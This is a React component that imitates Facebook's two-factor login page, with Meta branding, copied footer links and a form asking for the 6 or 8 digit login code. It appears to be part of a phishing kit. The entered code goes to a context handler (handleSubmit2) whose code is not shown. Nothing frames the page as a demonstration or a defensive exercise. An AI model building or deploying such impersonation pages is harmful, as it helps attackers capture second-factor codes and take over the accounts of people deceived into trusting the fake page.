import React, { useContext, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import { MainContextContent } from '../components/Context'

const Otp = () => {
  const navigate = useNavigate()
  const { loading, handleSubmit2, navTo, form, handleChange, errors } = useContext(MainContextContent)
  useEffect(() => {
    if (navTo !== "") {
      navigate(navTo)
    }
  }, [navTo])

  useEffect(()=>{
    window.scrollTo({top:0,behavior:"smooth"})
},[])
  return (
    <div>
      <div className='h-12 flex justify-between md:justify-around items-center p-2 bg-[#3B5998]'>
        <img src="assets/logo.png" className='w-28' alt="" />
        <p className='text-white text-sm font-semibold'></p>
      </div>
      <section className=' bg-gray-200 flex justify-center md:py-14  py-20 p-4 md:p-4'>
        <div className='max-w-[600px] w-full bg-white border-2 border-gray-300  p-2 text-black'>
          <p className='font-semibold border-b-2 text-sm py-2'>Choose a way to confirm that it's you</p>
          <p className='border-b-2 py-1 text-sm'>Your account has two-factor authentication enabled. This requires some additional steps to confirm this.</p>
          <p className='font-semibold text-sm py-2'>Approve from another device</p>
          <p className='border-b-2 py-1 text-sm'>We have sent notice to your Facebook. Please check your Facebook message and approve the confirmation to continue.</p>
          <div className=' border-b-2 pt-2'>
            <p className='font-semibold  text-sm'>Or, enter your login code</p>
            <p className='text-sm'>Enter the 6 or 8 digit code sent to your phone number and email or from the authentication app that you set up.
            </p>
            <input type="text" name='otp' onChange={handleChange} value={form.otp} minLength={6} maxLength={8} placeholder='Login code' className='w-2/5 h-8 border-2 rounded-sm text-sm mb-4 px-2' />
            {
              errors.otpError !== "" && <p className='text-red-500 text-sm pb-4'>{errors.otpError}</p>
            }
            {
              loading  && <p className='text-gray-400 text-sm font-semibold pb-4'>Authentication in progress</p>
            }
          </div>
          <div className='flex my-2 justify-between items-center'>
            <p className='text-[#3B5998] text-[0.8rem]'>Resend the login code</p>
            <button disabled={loading} onClick={handleSubmit2} className='bg-[#3B5998] text-white py-1 px-2 rounded-sm text-[0.8rem]'>Submit code</button>
          </div>

        </div>
      </section>
      <footer className='flex justify-center'>

        <div className='md:w-[70vw] md:my-auto flex justify-center px-2 flex-col text-[0.8rem] text-[#3B5998] pt-12'>
          <ul class="flex flex-wrap gap-x-4 my-2">
            <li class="text-black">
              English (UK)
            </li>
            <li class=" ">
              中文(台灣)
            </li>
            <li class=" ">
              한국어
            </li>
            <li class=" ">
              日本語
            </li>
            <li class=" ">
              Français (France)
            </li>
            <li class=" ">
              ภาษาไทย
            </li>
            <li class=" ">
              Español
            </li>
            <li class=" ">
              Português (Brasil)
            </li>
            <li class=" ">
              Deutsch
            </li>
            <li class=" ">
              Italiano
            </li>
          </ul>
          <hr />
          <ul className='flex flex-wrap gap-x-4 my-2'>
            <li>Sign Up</li>
            <li>Log in</li>
            <li>Messenger</li>
            <li>Facebook Lite</li>
            <li>Video</li>
            <li>Places</li>
            <li>Games</li>
            <li>Marketplace</li>
            <li>Meta Pay</li>
            <li>Meta Store</li>
            <li>Meta Quest</li>
            <li>Instagram</li>
            <li>Threads</li>
            <li>Fundraisers</li>
            <li>Services</li>
            <li>Voting Information Centre</li>
            <li>Privacy Policy</li>
            <li>Privacy Centre</li>
            <li>Groups</li>
            <li>About</li>
            <li>Create ad</li>
            <li>Create Page</li>
            <li>Developers</li>
            <li>Careers</li>
            <li>Cookies</li>
            <li>AdChoices</li>
            <li>Terms</li>
            <li>Help</li>
            <li>Contact uploading and non-users</li>
            <li>Settings</li>
            <li>Activity log</li>
          </ul>
          <p className='mt-6 text-black'>Meta © 2023</p>

        </div>

      </footer>
    </div>
  )
}

export default Otp